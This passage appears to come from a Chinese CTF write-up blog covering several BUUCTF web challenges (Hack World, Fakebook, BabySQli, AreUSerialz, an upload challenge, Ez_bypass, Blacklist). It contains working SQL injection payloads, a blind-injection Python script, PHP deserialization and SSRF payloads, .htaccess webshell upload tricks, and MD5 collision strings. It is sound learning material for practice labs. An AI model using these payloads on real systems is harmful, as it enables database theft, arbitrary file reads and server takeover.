+&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))%23
+得到表名：H4rDsq1
+
+or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23
+得到字段：id,username,password
+
+查数据：
+or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23
+只查到了一半：XPATH syntax error: &#39;~1flagflag{b615ddd5-228b-4383-9a&#39;
+可以使用right()语句：
+or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))%23</code></pre><h3 id="0x18ciscn2019-华北赛区-day2-web1hack-world" class="heading-element"><span>0x18.[CISCN2019 华北赛区 Day2 Web1]Hack World</span>
+  <a href="#0x18ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack-world" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>找个字典跑了一下，过滤了一些，有些没过滤。</p>
+<p>布尔盲注：</p>
+<p>用的网上的脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://07113360-9eb3-4e8d-8085-4284220b1372.node3.buuoj.cn/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1^if((ascii(substr((select(flag)from(flag)),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">),0,1)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#或者：0^(ascii(substr((select(flag)from(flag)),%d,1))=%d)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#print(payload)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Hello, glzjin wants a girlfriend.&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#res += (chr(j))</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;end ....&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></span></span></code></pre></div><p>其中，异或的^可以起到or的作用</p>
+<p>因为每次跑的时候会漏掉一些，所以将每个都输出，然后将缺少的在打印。</p>
+<h3 id="0x19网鼎杯-2018fakebook" class="heading-element"><span>0x19.[网鼎杯 2018]Fakebook</span>
+  <a href="#0x19%e7%bd%91%e9%bc%8e%e6%9d%af-2018fakebook" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>robots.txt有源码泄露</p>
+<p>可能与ssrf有关</p>
+<p>登陆后有SQL注入，对空格有过滤，可以报错注入或者/**/代替空格：</p>
+<pre tabindex="0"><code>?no=-1 or updatexml(1,concat(&#39;\~&#39;,database(),&#39;\~&#39;),1)#
+数据库名：fakebook 
+
+no=11/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables where table_schema=&#39;fakebook&#39; #
+表名：users
+
+no=11/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns where table_schema=&#39;fakebook&#39;and table_name=&#39;users&#39; #
+字段：no,username,passwd,data 
+
+之后返回的是：
+O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:6:&#34;123123&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:13:&#34;www.baidu.com&#34;;} </code></pre><p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210503165820953.png' alt="image-20210503165820953" height="330" width="1586"></p>
+<p>那么进行反序列化：</p>
+<p><img loading="lazy" src='/posts/buu-web-0x10-0x1f/image-20210503170124576.png' alt="image-20210503170124576" height="416" width="1358"></p>
+<p>因为blog是在data，所以：</p>
+<pre tabindex="0"><code>no=-1/**/union/**/select/**/1,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:0:&#34;&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</code></pre><p>源码中有flag。</p>
+<h3 id="0x1agxyctf2019babysqli" class="heading-element"><span>0x1A.[GXYCTF2019]BabySQli</span>
+  <a href="#0x1agxyctf2019babysqli" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>考点：联合注入添加临时虚拟用户</p>
+<p>随便输入后看源码，</p>
+<blockquote>
+<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p></blockquote>
+<p>先base32，之后是64</p>
+<blockquote>
+<p>select * from user where username = &lsquo;$name&rsquo;</p></blockquote>
+<p>测试了下是3个字段：</p>
+<blockquote>
+<p>union select 1,2,3</p></blockquote>
+<p>当username不是admin的时候报错wrong user，否则报wrong password</p>
+<p>将&rsquo;admin&rsquo;放在2的位置上报王蓉 password</p>
+<blockquote>
+<p>union select 1,&lsquo;admin&rsquo;,3</p></blockquote>
+<p>mysql当联合查询时，没有的话会在数据库中加入临时的</p>
+<!-- raw HTML omitted -->
+<p>(实际上应该不用猜，应该是个坑，原题应该有提示密码是md5加密储存的)</p>
+<p>猜测语句是这样的:</p>
+<pre tabindex="0"><code>&lt;?php$row;
+$pass=$_POST[&#39;pw&#39;];
+if($row[&#39;username&#39;]==’admin’){
+if($row[&#39;password&#39;]==md5($pass)){ 
+echo $flag; 
+}else{ echo “wrong pass!”; 
+}}
+else{ echo “wrong user!”;}</code></pre><p>那么可以这样构造：123的md5：202cb962ac59075b964b07152d234b70</p>
+<p>于是：adf&rsquo;union select 1,&lsquo;admin&rsquo;,&lsquo;202cb962ac59075b964b07152d234b70&rsquo;</p>
+<p>pwd为123</p>
+<h3 id="0x1b网鼎杯-2020-青龙组areuserialz" class="heading-element"><span>0x1B.[网鼎杯 2020 青龙组]AreUSerialz</span>
+  <a href="#0x1b%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>看了wp才做出来的，确实感觉这道题挺有意思。</p>
+<p>首先get传str，每个字符要在32到125之间，之后反序列化。</p>
+<p>反序列化时用了__destruct方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>如果op为2，赋值为1，溶蚀content赋为空，再之后执行process，这里op与2比较是强比较。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Bad Hacker!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>如果op是1，进入write，如果是2的话进入output，这里两处都是若比较。</p>
+<p>所以说只要领op=2（整形），那么两处都可以绕过，（第一处绕过字符，第二如直接read）。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div><p>filename可以控制，接着使用file_get_contents函数读文件，这里可以用php://filter伪协议读文件，然后输出。</p>
+<p>但是还有一个问题，$op,$filename,$content这三个都是protected，protected权限的变量序列化的时候会有%00*%00字符，而%00的ASCII编码为0，不能绕过is_valid的检查。</p>
+<p>绕过的话，php7.1+的版本对属性类型不敏感，本地序列化的时候可以使用public绕过。</p>
+<p>（protected/private类型的属性序列化后产生不可打印字符，public类型则不会。）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>总的来说这道题还是很有意思的，学到了很多。</p>
+<h3 id="0x1cmrctf2020你传你呢" class="heading-element"><span>0x1C.[MRCTF2020]你传你🐎呢</span>
+  <a href="#0x1cmrctf2020%e4%bd%a0%e4%bc%a0%e4%bd%a0%e5%91%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>上传.htaccess，有几种写法：</p>
+<blockquote>
+<p>SetHandler application/x-httpd-php</p></blockquote>
+<pre tabindex="0"><code>&lt;FilesMatch &#34;bbb&#34;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+//其中bbb是要包含的文件，都会被当做php来执行</code></pre><blockquote>
+<pre tabindex="0"><code>AddType application/x-httpd-php .png</code></pre></blockquote>
+<p>大致就上面3种写法吧。</p>
+<p>PS：当时一直连不上。。原来是htaccess写成了htacess</p>
+<p>然后就社写马上传蚁剑连接就ok了。</p>
+<h3 id="0x1dmrctf2020ez_bypass" class="heading-element"><span>0x1D.[MRCTF2020]Ez_bypass</span>
+  <a href="#0x1dmrctf2020ez_bypass" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>第一个绕过有两种绕法，之前的一个绕md5的题中也写了：</p>
+<p>第一种：MD5碰撞</p>
+<blockquote>
+<p>?gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p></blockquote>
+<p>或者</p>
+<pre tabindex="0"><code>$s1 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
+$s2 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&#34;
+$s3 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
+以上3个的字符串都不相等，但是md5值相等。</code></pre><p>第二种，数组绕过：</p>
+<blockquote>
+<p>?gg[]=1&amp;id[]=1</p></blockquote>
+<p>第二个绕过就是简单的在后面加字符就OK</p>
+<blockquote>
+<p>passwd=1234567a</p></blockquote>
+<h3 id="0x1egyctf2020blacklist" class="heading-element"><span>0x1E.[GYCTF2020]Blacklist</span>
+  <a href="#0x1egyctf2020blacklist" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有2个字段，但是union select 爆出说不能select，那么堆叠查询。</p>
+<p>show databases;show tables ;show columns from &lsquo;表名&rsquo;；</p>
+<p>一共有两个表，words，FlagHere</p>
+<p>绕过技巧有3个：</p>
+<p>1）修改表名</p>
+<p>其中words：show columns from words 后是id和data</p>
+<p>而Flag中只有一个flag。</p>
+<p>推测是select id,data from words where id=&rsquo;$id$&rsquo;</p>
+<p>那么：</p>
+<pre tabindex="0"><code>1.将words表名换成其他的名字
+2.将FlagHere换成words表名
+3.吧flag这个字段换成data
+4.再插入一个id字段</code></pre><pre tabindex="0"><code>1&#39;;
+alter table words rename to words1;
+alter table `FlagHere` rename to words;
+alter table words change flag id varchar(50);#
+
+然后 1&#39; or 1=1# 将flag打印出来</code></pre><p>2）预编译</p>
+<pre tabindex="0"><code>PREPARE name from &#39;[my sql sequece]&#39;;   //预定义SQL语句
+EXECUTE name;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句</code></pre><pre tabindex="0"><code>SET @tn = &#39;hahaha&#39;;  //存储表名
+SET @sql = concat(&#39;select * from &#39;, @tn);  //存储SQL语句
